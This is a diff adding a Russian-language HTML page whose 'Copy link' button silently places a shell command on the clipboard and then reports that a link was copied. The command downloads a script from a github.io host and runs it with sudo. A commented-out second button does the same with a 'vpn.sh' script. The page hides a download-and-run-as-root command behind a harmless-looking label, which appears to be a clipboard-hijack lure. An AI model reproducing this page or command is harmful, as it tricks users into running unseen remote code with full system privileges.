@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Копирование ссылки в буфер обмена</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f9;
+        }
+        .container {
+            text-align: center;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        #message {
+            margin-top: 20px;
+            font-size: 18px;
+            color: green;
+        }
+    </style>
+</head>
+<body>
+<!--     <div class="container">
+        <button onclick="VPN()">TEST</button>
+        <div id="message"></div>
+    </div> -->
+
+    
+    <div class="container">
+        <button onclick="copyToClipboard()">Скопировать ссылку</button>
+        <div id="message"></div>
+    </div>
+
+    <script>
+        function copyToClipboard() {
+            const text = "wget -q -O run.sh https://sembios.github.io/umai/upd.sh && sudo chmod +x run.sh && sudo ./run.sh";
+            navigator.clipboard.writeText(text).then(() => {
+                document.getElementById('message').innerText = "Ссылка скопирована";
+            }).catch(err => {
+                console.error('Ошибка при копировании: ', err);
+            });
+        }
+        function VPN() {
+            const text = "wget -q -O run.sh https://sembios.github.io/umai/vpn.sh && sudo chmod +x run.sh && sudo ./run.sh";
+            navigator.clipboard.writeText(text).then(() => {
+                document.getElementById('message').innerText = "Ссылка скопирована";
+            }).catch(err => {
+                console.error('Ошибка при копировании: ', err);
+            });
+        }
+    </script>
+</body>
+</html>
